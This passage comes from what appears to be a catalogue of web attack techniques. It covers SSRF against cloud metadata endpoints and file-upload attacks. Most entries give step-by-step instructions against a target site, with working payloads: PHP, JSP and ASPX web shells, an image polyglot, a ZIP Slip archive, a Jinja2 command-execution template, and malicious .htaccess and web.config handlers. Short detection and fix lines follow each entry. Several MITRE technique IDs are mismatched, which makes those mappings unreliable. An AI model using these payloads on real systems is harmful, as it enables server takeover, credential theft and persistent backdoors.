benign but internal URLs such as http://localhost:3306 (for MySQL) or http://169.254.169.254 (cloud metadata service) and observe the behavior. If you get timeouts, unusual response codes, or errors, it confirms the request was processed. Step 7: Once confirmed, you can use this channel to access internal admin panels, read internal APIs, or trigger requests to cloud metadata endpoints like http://169.254.169.254/latest/meta-data/iam/security-credentials/. Step 8: You can also chain this with a tool like Burp Repeater or Intruder to fuzz various Base64-encoded targets. Step 9: Obfuscation can be improved further by double-encoding (base64(base64(url))) or URL-encoding the Base64 string to bypass weak validation or WAF filters. Step 10: Since the actual target URL is hidden in encoded form, detection systems that only inspect plaintext URLs may miss the attack, making it stealthy and hard to trace.
- **Detection**: Monitor URL-decoding logic, flag Base64 input patterns in web traffic, use web application firewalls with decoding support
- **Solution**: Decode and validate all Base64 parameters before usage, allowlist destination domains, apply SSRF protections like metadata IP block
- **Tags**: SSRF, Base64, Obfuscation, Cloud Metadata, Web Attack

## SSRF with Browser-Based Open Redirect Chain

- **Attack Type**: SSRF via client-side redirect used by server
- **Target**: SSRF-vulnerable fetch endpoints
- **Vulnerability**: Open redirect abuse chained with SSRF
- **MITRE**: T1190 – Exploitation for Initial Access
- **Impact**: Internal network access, metadata leak
- **Tools**: Burp Suite, attacker-controlled domain, Redirect tools
- **Scenario**: App allows fetching a browser URL (e.g., preview URL), which opens an attacker-controlled site that instantly redirects to internal services via 302 redirect.
- **Attack Steps**: Step 1: Identify a SSRF-vulnerable feature such as link preview, image renderer, or PDF fetcher where the app allows you to input a URL. Step 2: Register a domain you control (e.g., attacker.com) and set it up to instantly redirect to an internal URL, such as http://169.254.169.254/latest/meta-data/. Step 3: Implement the redirect in your server using HTTP status 302 or JavaScript-based redirect (window.location). Step 4: Provide the original SSRF feature with the external http://attacker.com URL. Step 5: The app fetches attacker.com, receives the 302 response, and blindly follows the redirect to internal metadata endpoint. Step 6: The server completes the request to internal service, which returns sensitive information like IAM roles, secrets, or tokens. Step 7: You may receive this data in response or use blind SSRF tracking (Interactsh). Step 8: This method chains trusted browser redirection with insecure backend fetch logic, bypassing domain allow-lists.
- **Detection**: Detect outbound 302-chained SSRF to internal IPs
- **Solution**: Never follow redirects in SSRF fetchers; validate final resolved IP and domain before following redirects
- **Tags**: SSRF, Redirect Chain, Metadata Theft, Cloud Attack

## SSRF via SSRF in Serverless Function Fetch

- **Attack Type**: SSRF in Lambda or Cloud Functions fetching URLs
- **Target**: Cloud Functions / Serverless apps
- **Vulnerability**: Serverless URL fetch logic with no validation
- **MITRE**: T1530 – Data from Cloud Storage
- **Impact**: Credential access, cloud pivoting, lateral movement
- **Tools**: AWS Lambda, Burp Suite, Interactsh, curl
- **Scenario**: Cloud functions (like AWS Lambda) fetch attacker-supplied URLs and are vulnerable to SSRF, potentially accessing metadata, files, or internal APIs.
- **Attack Steps**: Step 1: Identify a serverless function (e.g., image processing, link validation) that accepts URLs from users and fetches them internally. These functions often run with high privileges. Step 2: Input a crafted URL such as http://169.254.169.254/latest/meta-data/ into the function's input field or API parameter. Step 3: If no validation exists, the function performs a server-side request to the metadata URL. Step 4: Capture output — if direct, you may get JSON response with secrets, roles, or environment data. Step 5: If output is blind, use Interactsh or DNS loggers to detect network activity or leaks. Step 6: Try chaining with headers like X-Forwarded-Host or other serverless quirks to gain deeper access. Step 7: This is highly dangerous, as many serverless apps run in cloud provider environments and can expose cloud-level credentials.
- **Detection**: Monitor HTTP egress from functions to metadata/internal IPs
- **Solution**: Block all internal IPs and metadata addresses; validate URL scheme and domain in code
- **Tags**: SSRF, Serverless, Cloud Metadata, Lambda Abuse

## SSRF via Redirect in 302 Location Header

- **Attack Type**: SSRF via server-side redirect follow behavior
- **Target**: Backend fetchers supporting redirection
- **Vulnerability**: No verification of redirect targets
- **MITRE**: T1071 – App Layer Protocol Abuse
- **Impact**: Metadata theft, internal service exposure
- **Tools**: Burp Suite, curl, Python HTTP server
- **Scenario**: SSRF filter accepts only whitelisted domains but blindly follows 302 Location: headers to internal IPs, enabling indirect access.
- **Attack Steps**: Step 1: Identify an SSRF input field where the app accepts external URLs. Step 2: Set up your own server to respond with a 302 Found status and a Location: header pointing to an internal resource like http://127.0.0.1:80. Example: HTTP/1.1 302 Found Location: http://169.254.169.254. Step 3: Input your server's URL (e.g., http://attacker.site/redirect) into the SSRF field. Step 4: The backend receives the 302 and blindly follows it. Step 5: This causes the app to fetch internal metadata or services you’ve redirected to. Step 6: You may retrieve output directly (reflected SSRF) or detect activity via DNS/logs (blind SSRF). Step 7: You can test multiple internal targets by modifying the redirect destination. Step 8: This attack works because the SSRF filter verifies only the original URL, not where it eventually lands.
- **Detection**: Log and alert on outbound requests following 302 to internal IPs
- **Solution**: Disallow redirects to private/internal IPs; resolve all hops before making request
- **Tags**: SSRF, 302 Redirect, Internal Redirect Exploit

## SSRF using Cache Poisoning and Revalidation

- **Attack Type**: SSRF via manipulating caching logic and headers
- **Target**: CDN-backed or cache-layered apps
- **Vulnerability**: Poisoned cache headers cause backend SSRF
- **MITRE**: T1600 – Cache Poisoning
- **Impact**: Backend request tampering, internal service access
- **Tools**: Burp Suite, curl, Redis, CDN service (optional)
- **Scenario**: By poisoning a shared cache (like CDN) with a malicious redirect or URL, SSRF can occur on revalidation by the origin server.
- **Attack Steps**: Step 1: Identify a URL or resource fetched by the app and cached using services like CDN, reverse proxy, or cache layer (e.g., Varnish, Nginx). Step 2: Check if cache is poisoned via headers like X-Forwarded-Host, Host, or Location:. Step 3: Send a response to the cache that includes a Location: http://169.254.169.254 or Link: header to force a future revalidation to an internal URL. Step 4: When another user or the app accesses the cached resource, it will revalidate via the poisoned Location header, leading to SSRF. Step 5: You may encode the payload with percent encoding or cache-injection tricks to bypass detection. Step 6: Monitor responses or external loggers to confirm internal URL fetches occurred during cache refresh. Step 7: This can chain with signed URL bypass or open redirect SSRF for greater effect.
- **Detection**: Analyze cache behavior and revalidation traffic; monitor Location headers and dynamic origin fetches
- **Solution**: Do not cache untrusted headers; prevent origin fetches from user-supplied cache revalidation instructions
- **Tags**: SSRF, Cache Poisoning, Revalidation Exploit, Header Injection

## SSRF in QR Code Generator via Embedded URLs

- **Attack Type**: SSRF via malicious URL inside generated QR code
- **Target**: QR/Barcode generator web apps
- **Vulnerability**: Server fetch triggered by user-supplied QR code data
- **MITRE**: T1190 – Exploitation for Initial Access
- **Impact**: Metadata exposure, internal API access
- **Tools**: Burp Suite, Interactsh, QR code tools
- **Scenario**: Web apps that generate QR codes by fetching and embedding remote URLs can be tricked into SSRF by using internal addresses in the URL payload.
- **Attack Steps**: Step 1: Find a QR Code Generator feature that allows user-supplied URLs to be embedded into the QR code (for marketing, payments, etc.). Step 2: Instead of a public URL, input an internal IP address or cloud metadata URL (e.g., http://169.254.169.254/latest/meta-data/). Step 3: The server generating the QR code might first validate or even fetch the URL contents to check if it's reachable. Step 4: This fetch request becomes an SSRF if it reaches internal resources that users shouldn't access. Step 5: If the app returns the QR code without validation, it may even leak internal resources visually encoded into the QR. Step 6: For blind SSRF, use Interactsh or DNSBin to monitor if your injected URL is hit. Step 7: You can test other internal targets like http://127.0.0.1, http://localhost:8080, or internal API endpoints. Step 8: Confirm SSRF by checking logs, errors, or DNS callbacks.
- **Detection**: Monitor all URL fetches from QR generation modules
- **Solution**: Do not fetch unvalidated URLs from user input; validate domain/IP before any server-side processing
- **Tags**: SSRF, QR Exploit, Metadata Fetch, Embedded URL

## SSRF via SSRF in OAuth State Parameter

- **Attack Type**: SSRF by injecting callback state into OAuth flow
- **Target**: OAuth callback handlers
- **Vulnerability**: OAuth state not sanitized or validated
- **MITRE**: T1557 – Adversary-in-the-Middle
- **Impact**: Privilege escalation, credential theft, SSRF to internal services
- **Tools**: Burp Suite, OAuth Playground, Interactsh
- **Scenario**: Some OAuth systems accept state parameters or callback URLs which are later fetched or resolved by the backend, allowing SSRF through crafted input.
- **Attack Steps**: Step 1: Use an OAuth login flow (e.g., login with Google/Facebook) on a target app that accepts a state parameter. This is often used to preserve session or redirect data. Step 2: Modify the state parameter or related fields to contain a full URL (e.g., http://169.254.169.254/latest/meta-data) or attacker-controlled domain. Step 3: If the backend fetches this URL during callback handling (to validate, log, or redirect), it can result in SSRF. Step 4: You may receive a response if SSRF is reflected, or use blind SSRF detectors like Interactsh if no output is returned. Step 5: You can also use redirect chaining or embed SSRF payloads inside URL-encoded state fields. Step 6: This bypasses many protections because OAuth parameters are often trusted implicitly. Step 7: Confirm SSRF by testing metadata endpoint access, internal IPs, or internal hostnames.
- **Detection**: Monitor unusual state values; log outbound requests during OAuth callback handling
- **Solution**: Always validate state/callback parameters; never fetch them internally; whitelist redirect domains
- **Tags**: SSRF, OAuth State, Callback Abuse, Cloud Metadata

## SSRF via IP Spoofing or Header Trust Abuse

- **Attack Type**: SSRF through IP-based trust with spoofed headers
- **Target**: Internal IP protected SSRF services
- **Vulnerability**: Trusting spoofed client IP headers
- **MITRE**: T1133 – External Remote Services
- **Impact**: Internal bypass of IP filtering, metadata theft
- **Tools**: Burp Suite, curl, custom header injections
- **Scenario**: Some apps whitelist internal IPs for special access and trust headers like X-Forwarded-For or Client-IP — attackers can spoof these headers to exploit SSRF.
- **Attack Steps**: Step 1: Identify an endpoint that fetches a user-supplied URL or performs server-side logic based on IP trust. Step 2: Craft a request with headers like X-Forwarded-For: 127.0.0.1 or Client-IP: 127.0.0.1. Step 3: Send the request to a SSRF-prone feature with a restricted internal address like http://169.254.169.254/. Step 4: If the backend uses IP-based allow-listing and trusts those spoofed headers, the request may succeed and SSRF will occur. Step 5: Confirm using internal responses or monitor if internal service gets triggered (via Interactsh). Step 6: This works especially well when behind load balancers, CDNs, or reverse proxies not properly configured to sanitize headers. Step 7: Try bypassing filters with multiple IPs (e.g., X-Forwarded-For: 127.0.0.1, 1.2.3.4) or malformed values to bypass logging. Step 8: Repeat for other headers like X-Real-IP, Forwarded, CF-Connecting-IP.
- **Detection**: Check logs for spoofed headers; inspect behavior based on X-Forwarded-For, Client-IP, etc.
- **Solution**: Do not trust headers from users; configure reverse proxies to strip and set headers securely
- **Tags**: SSRF, IP Spoof, Header Injection, Metadata Fetch

## SSRF via HTTP/2 Smuggling or Multiplexed Streams

- **Attack Type**: SSRF via stream multiplexing in HTTP/2 tunnels
- **Target**: HTTP/2 backends, APIs, proxies
- **Vulnerability**: Misparsed HTTP/2 requests enabling SSRF chaining
- **MITRE**: T1131 – Exploitation for Privilege Escalation
- **Impact**: Backend internal access, SSRF bypasses, metadata exposure
- **Tools**: h2c-smuggler, curl with HTTP/2, Burp Repeater
- **Scenario**: In HTTP/2, multiple requests share the same connection. Misconfigured backend or proxy may allow multiplexed SSRF streams to internal hosts.
- **Attack Steps**: Step 1: Find a target web app or reverse proxy that supports HTTP/2 (many CDNs, load balancers, and APIs do). Step 2: Use tools like curl --http2 or h2c-smuggler to test if the backend allows request smuggling via stream multiplexing. Step 3: Inject multiple requests in one stream — first to a valid public path, then sneak in a second GET request targeting an internal address like http://169.254.169.254. Step 4: If the backend doesn’t properly separate streams or validate destinations, it may process the second internal request — enabling SSRF. Step 5: You can also attempt CRLF smuggling or use Transfer-Encoding: chunked and smuggle requests hidden inside chunked bodies. Step 6: Detect success through timing anomalies, indirect responses, or blind detection tools like Interactsh. Step 7: This method works when HTTP/1 SSRF is filtered, but HTTP/2 is mishandled. Step 8: Confirm vulnerability by extracting metadata or internal API data from the forged stream.
- **Detection**: Use deep packet inspection and multiplexing-aware filters
- **Solution**: Use HTTP/2-aware proxies; deny connection reuse for mixed internal/external paths
- **Tags**: SSRF, HTTP2 Smuggling, Stream Multiplexing, H2C Attack

## Upload PHP Web Shell (e.g., shell.php)

- **Attack Type**: Remote Code Execution via File Upload
- **Target**: File Upload Endpoints
- **Vulnerability**: Unrestricted File Upload
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Full server access, data leak, malware upload
- **Tools**: Burp Suite, shell.php, browser
- **Scenario**: Attacker uploads a PHP file containing malicious code that allows executing server commands remotely.
- **Attack Steps**: Step 1: Go to the file upload section of the target website (e.g., profile picture, document upload, etc.). Step 2: Create a simple PHP file named shell.php with the following code: <?php system($_GET['cmd']); ?>. This allows executing any Linux command via the URL parameter. Step 3: Try uploading the file as it is. If the server doesn’t block it, the upload succeeds. Step 4: Visit the file in the browser, e.g., http://target.com/uploads/shell.php?cmd=whoami. Step 5: If the code is executed, you’ll see the output of the command on screen. Step 6: Now try other commands like ls, cat /etc/passwd, etc. Step 7: You have achieved remote code execution (RCE) on the server.
- **Detection**: Monitor for uploaded .php files in public folders
- **Solution**: Restrict file types and validate on server; do not allow .php or executable uploads
- **Tags**: PHP Web Shell, RCE, File Upload

## Content-Type Bypass using MIME Smuggling

- **Attack Type**: Bypass Upload Filter via Content-Type Header
- **Target**: File Upload with MIME checks
- **Vulnerability**: MIME Type Based Validation Bypass
- **MITRE**: T1133 – External Remote Services
- **Impact**: Remote Code Execution, Filter Bypass
- **Tools**: Burp Suite, curl
- **Scenario**: Server checks only the Content-Type (e.g., image/jpeg) of the upload to allow files, but doesn’t verify content, enabling attackers to smuggle malicious code.
- **Attack Steps**: Step 1: Prepare your shell.php file with malicious PHP code. Step 2: Use Burp Suite or curl to modify the HTTP request when uploading the file. Step 3: Change the Content-Type header to image/jpeg (even though it's a .php file). For example: Content-Type: image/jpeg while sending shell.php. Step 4: The server thinks it’s an image based on the header and allows the upload. Step 5: Once uploaded, go to the uploaded file’s URL like http://target.com/uploads/shell.php?cmd=id. Step 6: If the server processes PHP, your command will execute. Step 7: You bypassed the server-side filter using MIME smuggling.
- **Detection**: Log and inspect MIME headers in upload requests
- **Solution**: Validate file type by reading file content, not just headers; enforce strict file-type whitelist
- **Tags**: MIME Smuggling, File Upload Bypass

## File Extension Double-Bypass (.php.jpg)

- **Attack Type**: Extension Bypass for Executable File Upload
- **Target**: File Upload with loose extension checks
- **Vulnerability**: Insecure extension validation
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Server-side code execution, security bypass
- **Tools**: Burp Suite, shell.php renamed as shell.php.jpg
- **Scenario**: Uploading a file named .php.jpg may bypass front-end or back-end filters if they only check for .jpg, but backend server executes it as .php.
- **Attack Steps**: Step 1: Rename your malicious shell.php file to shell.php.jpg. Step 2: Upload it via the file upload form where images are allowed. Step 3: Some systems only check the extension .jpg and allow it. Step 4: The server stores it as shell.php.jpg in a folder like /uploads/. Step 5: Try accessing it via browser: http://target.com/uploads/shell.php.jpg?cmd=whoami. Step 6: If the server parses the file based on the first .php part, it may still execute the PHP code inside. Step 7: You have now achieved code execution using double extension bypass.
- **Detection**: Inspect uploaded file extensions vs real file type
- **Solution**: Always validate file extensions at server level and disallow .php anywhere in name
- **Tags**: Double Extension, PHP Upload, Filter Bypass

## Case Variation or Null Byte Injection (shell.pHp%00.jpg)

- **Attack Type**: Null Byte Injection / Case Filter Bypass
- **Target**: Uploads with weak filename validation
- **Vulnerability**: Null byte handling or case-insensitive filters
- **MITRE**: T1552 – Unsecured Credentials
- **Impact**: Remote code execution, upload validation bypass
- **Tools**: Burp Suite, shell.pHp%00.jpg
- **Scenario**: Some servers check file extensions in a case-sensitive or truncated way, allowing .pHp or %00.jpg to bypass checks and execute code.
- **Attack Steps**: Step 1: Prepare your PHP web shell file and name it shell.pHp (note capitalized letters) or shell.php%00.jpg (where %00 is null byte). Step 2: In Burp Suite, intercept the request and manually set the filename to shell.pHp or shell.php%00.jpg. Step 3: The application might only filter .php in lowercase or stop processing at %00, treating it as .php. Step 4: The server saves the file and may allow execution based on .php. Step 5: Visit the URL like http://target.com/uploads/shell.pHp?cmd=id. Step 6: If code executes, you bypassed the filter using case or null byte injection. Step 7: Try other combinations like shell.PHP, shell.php%00.png, or .php .jpg. Step 8: You now understand how some servers fail to handle file names securely.
- **Detection**: Analyze filename parsing logic, especially with unusual characters or cases
- **Solution**: Normalize filename extensions, remove null bytes, and convert extensions to lowercase for proper validation
- **Tags**: Null Byte, Case Bypass, Filename Exploit

## Client-Side Filtering Bypass via Manual Request

- **Attack Type**: Client-side JavaScript filter bypass
- **Target**: Uploads protected only on client-side
- **Vulnerability**: No server-side validation, JS-only filter
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Remote Code Execution, filter evasion
- **Tools**: Burp Suite, browser, shell.php
- **Scenario**: Some websites block .php or other dangerous files only in JavaScript — but an attacker can bypass this using manual requests (e.g., via Burp Suite).
- **Attack Steps**: Step 1: Go to a site with a file upload feature and try uploading a shell.php file. You’ll likely see a JavaScript alert or block message. Step 2: Intercept the upload request using Burp Suite (Proxy → Intercept → On). Step 3: Even if JavaScript blocked .php, you can manually edit the request in Burp and change the filename to shell.php. Step 4: Forward the modified request. Step 5: If the server only relied on the client-side check, it will accept the .php file. Step 6: Visit the uploaded file's URL, like http://target.com/uploads/shell.php?cmd=whoami. Step 7: If the command executes, the server is vulnerable — JavaScript checks alone do not protect uploads.
- **Detection**: Compare upload UI behavior vs actual backend handling
- **Solution**: Always implement server-side validation and enforce MIME and extension checks
- **Tags**: JS Bypass, Client-side Filter, PHP Upload

## Image Polyglot Payload (PHP in JPEG Comments)

- **Attack Type**: Image + PHP Polyglot Execution
- **Target**: Web servers with PHP support
- **Vulnerability**: Executable code inside allowed media files
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Image upload turned into RCE
- **Tools**: ExifTool, Burp Suite, shell.php
- **Scenario**: Attackers inject PHP code into an image (e.g., JPEG metadata) — server treats it as an image, but PHP interpreter may still execute code if accessed as .php.
- **Attack Steps**: Step 1: Use an image file (e.g., a real photo.jpg). Step 2: Use ExifTool to inject PHP code into the image’s metadata: exiftool -Comment='<?php system($_GET["cmd"]); ?>' photo.jpg. Step 3: Save the new image as polyglot.php.jpg. Step 4: Upload this file via the target’s file upload form. Step 5: If the server allows .jpg and doesn’t validate content, the upload will succeed. Step 6: Try accessing it via browser like: http://target.com/uploads/polyglot.php.jpg?cmd=whoami. Step 7: If the server processes the .php content despite .jpg extension, the code will run. Step 8: You now have command execution using a polyglot file.
- **Detection**: Monitor for odd metadata or malformed image headers
- **Solution**: Scan image headers, avoid placing images in executable folders (e.g., Apache web root)
- **Tags**: Polyglot File, PHP in Image, ExifTool, Metadata Payload

## Upload to Web Root for Direct Execution

- **Attack Type**: File upload lands in a web-accessible location
- **Target**: Uploads stored in public web root
- **Vulnerability**: File placed in web-accessible executable folder
- **MITRE**: T1133 – External Remote Services
- **Impact**: Full Remote Code Execution via browser
- **Tools**: Burp Suite, shell.php
- **Scenario**: If the file upload path is in the web server’s root (e.g., /uploads/), attackers can upload .php and access it directly to execute server commands.
- **Attack Steps**: Step 1: Prepare a file shell.php with code like <?php system($_GET['cmd']); ?>. Step 2: Upload it using the target’s file upload form. Step 3: Observe the server’s response or file path after upload. If it shows something like /uploads/shell.php, the upload folder is likely web-accessible. Step 4: Visit the uploaded file directly in a browser: http://target.com/uploads/shell.php?cmd=whoami. Step 5: If you see output from the server, it confirms code execution. Step 6: You’ve exploited a file upload vulnerability where the server stores files in the web root and does not block .php. Step 7: This attack gives you full control of the server’s command line.
- **Detection**: Monitor access to uploaded file paths that get executed
- **Solution**: Store uploads outside web root; disallow execution of uploaded files; use random names and strict access controls
- **Tags**: Web Root Upload, Direct Access, Command Injection

## ZIP Slip via Directory Traversal in ZIP Archive

- **Attack Type**: File write outside allowed folder via ZIP
- **Target**: Applications that unpack uploaded ZIPs
- **Vulnerability**: ZIP archive with directory traversal paths
- **MITRE**: T1565 – Archive Manipulation
- **Impact**: Overwrite system files, backdoor web server
- **Tools**: zip, Burp Suite, evil shell.php
- **Scenario**: Some apps allow .zip file upload and extract them — attackers can craft ZIPs with paths like ../../../../etc/passwd to overwrite critical files or upload shells.
- **Attack Steps**: Step 1: Create a simple file called shell.php with malicious code: <?php system($_GET['cmd']); ?>. Step 2: Create a folder named ../../../../var/www/html/uploads/ and place shell.php inside it. Step 3: Use zip to compress it: zip --symlinks evil.zip ../../../../var/www/html/uploads/shell.php. Step 4: Upload this zip file using the target’s form that accepts ZIPs (e.g., bulk file import). Step 5: If the server extracts without validating file paths, your .php file will be placed in a sensitive location. Step 6: Go to the expected location in the browser, e.g., http://target.com/uploads/shell.php?cmd=id. Step 7: If it runs, the server is vulnerable to ZIP Slip and allows path traversal in archive extraction. Step 8: Use this to overwrite configs, drop shells, or plant backdoors.
- **Detection**: Monitor extraction logic and destination paths
- **Solution**: Sanitize extraction code to strip ../, enforce extraction inside fixed directory
- **Tags**: ZIP Slip, Directory Traversal, Archive Exploit

## Arbitrary File Placement via Path Parameter Control

- **Attack Type**: Arbitrary File Write via Parameter Injection
- **Target**: File upload with path control
- **Vulnerability**: No validation on file destination path
- **MITRE**: T1555 – Credentials from Password Stores
- **Impact**: RCE, privilege escalation, config tampering
- **Tools**: Burp Suite, shell.php
- **Scenario**: If an upload endpoint accepts a path or filename parameter, an attacker may be able to control where a file gets written on the server (e.g., placing a PHP shell in a web root).
- **Attack Steps**: Step 1: Prepare a simple PHP web shell file: <?php system($_GET['cmd']); ?> and name it shell.php. Step 2: Intercept the upload request using Burp Suite. Step 3: Look for a query parameter or form field like path=uploads/. Step 4: Change the parameter to something like ../../../../var/www/html/uploads/, which points to the web root directory. Step 5: Forward the request and upload the file. Step 6: If the server blindly trusts this path input, it will save the file in your chosen location. Step 7: Access the file via URL like http://target.com/uploads/shell.php?cmd=id. Step 8: If you see the result, code execution is successful. Step 9: You now have arbitrary file placement — can be used for RCE, config overwrite, or persistence.
- **Detection**: Check for unexpected files in sensitive paths
- **Solution**: Never allow users to control destination file paths; use strict server-side path sanitization
- **Tags**: Arbitrary Write, Path Control, Upload Injection

## Template Engine File Upload (Jinja2, Twig, ERB)

- **Attack Type**: RCE via Uploaded Template File
- **Target**: Template-based rendering engines
- **Vulnerability**: Unescaped server-side template processing
- **MITRE**: T1059 – Command and Scripting Interpreter
- **Impact**: Full backend code execution, privilege escalation
- **Tools**: Burp Suite, template file, text editor
- **Scenario**: Uploading a template file with payload (e.g., {{7*7}}, {{ config.items() }}) may result in code execution when rendered by the backend template engine.
- **Attack Steps**: Step 1: Create a file named poc.tpl or profile.html, depending on the engine. Inside, add a payload like {{ config.__class__.__init__.__globals__['os'].popen('id').read() }} for Jinja2. Step 2: Upload this file through any interface that accepts text, HTML, or template files (e.g., document generation or profile editor). Step 3: Observe if the file content is used by the backend for rendering a template (e.g., rendering into HTML or PDF). Step 4: If the file is processed as a template and not sanitized, the payload will execute on the server. Step 5: If output appears (e.g., uid=33(www-data)), you’ve executed code. Step 6: You now have achieved RCE using a template injection file. Step 7: This is common in apps that render uploaded files or form fields directly without escaping.
- **Detection**: Analyze rendering output or PDF/doc generation pipelines for injected logic
- **Solution**: Strictly escape all template variables; don’t render user-uploaded template content
- **Tags**: Jinja2, ERB, Twig, Template Injection, File Upload

## Stored Template Injection via Metadata Fields

- **Attack Type**: Stored Server-Side Template Injection (SSTI)
- **Target**: Template engine input fields
- **Vulnerability**: Metadata/field-based template injection
- **MITRE**: T1059 – Command and Scripting Interpreter
- **Impact**: RCE, sensitive data exposure, privilege escalation
- **Tools**: Burp Suite, ExifTool, file upload
- **Scenario**: Attackers embed template injection payloads in filenames, EXIF metadata, or form fields that get rendered by the template engine — triggering execution at render time.
- **Attack Steps**: Step 1: Prepare a normal image (e.g., JPEG) or text file. Step 2: Modify the filename or metadata to include a payload like {{7*7}} or {{ config.items() }}. For example, rename the file to {{7*7}}.jpg or use exiftool -Comment='{{ config.items() }}' image.jpg. Step 3: Upload the file to the application where such metadata or names are used in email templates, notifications, or dashboards. Step 4: Wait for the app to render the filename or metadata using a server-side template engine. Step 5: If vulnerable, the payload executes and leaks server info or allows code execution. Step 6: You’ve now triggered stored SSTI — no interaction needed from others. Step 7: Especially powerful if used in invoice PDFs, automated emails, or admin preview pages.
- **Detection**: Look for abnormal expressions in logs, filenames, or emails rendered via template engines
- **Solution**: Escape all template input fields and avoid using unsafe template renderers for untrusted content
- **Tags**: Stored SSTI, Metadata Injection, Jinja2, Email Exploit

## Malicious .htaccess File to Alter Execution Rules

- **Attack Type**: File-based Execution Control Hijack
- **Target**: Apache-hosted file directories
- **Vulnerability**: Unrestricted .htaccess; improper upload restrictions
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Remote Code Execution, Persistent Backdoor
- **Tools**: Apache, curl, FTP/SFTP, Burp, Text editor
- **Scenario**: Attackers upload or modify a .htaccess file on Apache servers to override directory settings, enabling PHP execution in upload folders or redirecting traffic to malicious scripts.
- **Attack Steps**: Step 1: Attacker locates a website running Apache with PHP support and an upload endpoint that allows .htaccess files (common in image upload, CMS file folders). Step 2: Uploads a crafted .htaccess file containing directives like AddType application/x-httpd-php .jpg .png, RewriteEngine On, RewriteRule .* .evil.php [L], or Options +ExecCGI. Step 3: They also upload a malicious script (e.g., shell.evil.php) into the same directory. Step 4: Accessing any file with the .jpg or .png extension now triggers PHP parsing due to the AddType rule, executing the stored shell script. Step 5: The attacker visits https://target.com/uploads/image.jpg, which silently runs shell.evil.php, giving them a web shell or command execution. Step 6: They verify access by running commands like whoami, ls, or id through the shell. Step 7: Attacker can now read sensitive files (/etc/passwd), modify content, pivot to internal networks, or create persistent backdoors. Step 8: To avoid detection, attacker may set RewriteRule ^favicon.ico$ http://attacker.site to stealthily redirect admin traffic to phishing pages. Step 9: These modifications persist because .htaccess overrides are allowed and no file integrity checks are in place. Step 10: If the server's AllowOverride is set to All, .htaccess directives are enabled—commonly on shared hosting. Step 11: Remediation may not happen until code review or log alerts notice new script executions.
- **Detection**: Detect new or modified .htaccess files via file integrity monitoring; check unexpected content-type changes in uploads; log RewriteRule usage
- **Solution**: Restrict upload extensions; disable AllowOverride or limit to None; sanitize uploads; use file integrity scanners (AIDE, Tripwire); enforce least-privileged file permissions
- **Tags**: Apache exploit, file upload abuse

## Upload web.config to Exploit IIS Config Parsing

- **Attack Type**: Config Injection on Microsoft IIS
- **Target**: Microsoft IIS servers
- **Vulnerability**: Misused config parsing via uploaded web.config
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Convert static file folders into code execution zones
- **Tools**: Burp Suite, text editor, IIS
- **Scenario**: IIS supports .config files like web.config for setting rules. Uploading a custom one may enable execution of previously non-executable files like .txt, .jpg, etc.
- **Attack Steps**: Step 1: Create a file named web.config with the following payload: <configuration><system.webServer><handlers><add name="myShell" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="c:\windows\system32\cmd.exe" resourceType="Unspecified" requireAccess="None" /></handlers></system.webServer></configuration>. Step 2: Upload the web.config file into a folder served by IIS (e.g., /images/ or /uploads/). Step 3: Then upload a .jpg file that contains a command like a shell command or reverse shell script. Step 4: Access the .jpg file via browser. Step 5: If successful, IIS will treat it as an executable and run the command. Step 6: This is possible if AllowOverride is enabled and web.config files are processed inside upload directories. Step 7: This can bypass extension filters completely.
- **Detection**: Monitor for uploaded .config files in content directories
- **Solution**: Disallow upload of .config, isolate static content folders from config parsing
- **Tags**: IIS Exploit, web.config RCE, Config Hijack

## JSP Shell Upload on Apache Tomcat

- **Attack Type**: Java Shell Upload (JSP)
- **Target**: Apache Tomcat or Java-based web apps
- **Vulnerability**: No restriction on .jsp file execution
- **MITRE**: T1059 – Command and Scripting Interpreter
- **Impact**: RCE, Tomcat takeover, persistence
- **Tools**: JSP shell, Burp Suite, Tomcat
- **Scenario**: Tomcat servers interpret .jsp files — attackers can upload malicious JSPs to achieve full RCE when the file is accessed via browser.
- **Attack Steps**: Step 1: Create a file named shell.jsp with this code: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>. Step 2: Upload it through a form that accepts files, such as resume or document submission. Step 3: If the server doesn't block .jsp, and the upload path is web-accessible, proceed to the next step. Step 4: Visit the uploaded file: http://target.com/uploads/shell.jsp?cmd=whoami. Step 5: If the output is returned in the browser (e.g., tomcat or root), code is executed. Step 6: This confirms RCE on Tomcat. Step 7: JSP shells can also chain with tools like ysoserial or JRMPListener for further exploitation. Step 8: Combine with WAR file uploads or admin panel misconfig for persistent access.
- **Detection**: Check for unexpected .jsp access or POST requests triggering system processes
- **Solution**: Disallow .jsp upload; never place uploads in executable Tomcat folders
- **Tags**: JSP Shell, Tomcat Exploit, WAR Upload

## ASPX Shell Upload on Microsoft IIS

- **Attack Type**: .NET Web Shell (ASPX)
- **Target**: Microsoft IIS with .NET support
- **Vulnerability**: Executable .aspx file placement in web root
- **MITRE**: T1059 – Command and Scripting Interpreter
- **Impact**: Full command execution in Windows IIS environment
- **Tools**: Burp Suite, ASPX shell, IIS
- **Scenario**: ASPX files are executed by IIS — uploading a .aspx file with a web shell gives attackers full command execution via the browser.
- **Attack Steps**: Step 1: Prepare a file called shell.aspx with this code: <%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start(Request["cmd"])); %>. Step 2: Upload this file through the web application if .aspx extension is allowed (e.g., profile pic, report upload). Step 3: If the file lands in a folder served by IIS (e.g., /uploads/), go to: http://target.com/uploads/shell.aspx?cmd=whoami. Step 4: If code executes and a response is returned, the attack worked. Step 5: This is a powerful method of achieving RCE in .NET environments. Step 6: You can also use pre-built shells like ASPXSpy, ChinaChopper, or reGeorg. Step 7: Combine with config manipulation or cookie tampering for privilege escalation.
- **Detection**: Look for .aspx uploads, command triggers, or suspicious file execution
- **Solution**: Block .aspx upload, enforce static MIME types in upload folders, use a separate domain for user uploads
- **Tags**: ASPX Shell, IIS Exploit, Windows RCE

## Stored SSTI in Uploaded Template File

- **Attack Type**: Stored Server-Side Template Injection (SSTI)
- **Target**: Template rendering engines (Flask, Twig, etc.)
- **Vulnerability**: Input rendered using unescaped template engines
- **MITRE**: T1059 – Command and Scripting Interpreter
